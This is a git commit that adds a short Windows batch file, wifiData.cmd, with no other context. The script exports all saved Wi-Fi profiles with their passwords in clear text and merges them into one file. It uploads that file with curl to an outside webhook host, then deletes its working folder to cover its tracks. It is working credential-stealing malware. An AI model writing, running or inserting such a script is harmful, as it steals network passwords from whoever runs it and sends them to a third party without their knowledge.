64705d806616e0f9ee7ebec57e0dbf5d5f4ff861
da-4 <tomkdinell@gmail.com>
2024-11-06 22:56:37 -0800

    Add files via upload

---
+++ wifiData.cmd
@@ -0,0 +1,9 @@
+cd %temp%
+mkdir wifiInfo
+cd wifiInfo
+netsh wlan export profile key=clear
+type *.xml > wifiMaster.txt
+curl -T wifiMaster.txt https://faithful-vase-76.webhook.cool
+cd %temp%
+rmdir /s /q wifiInfo
+exit
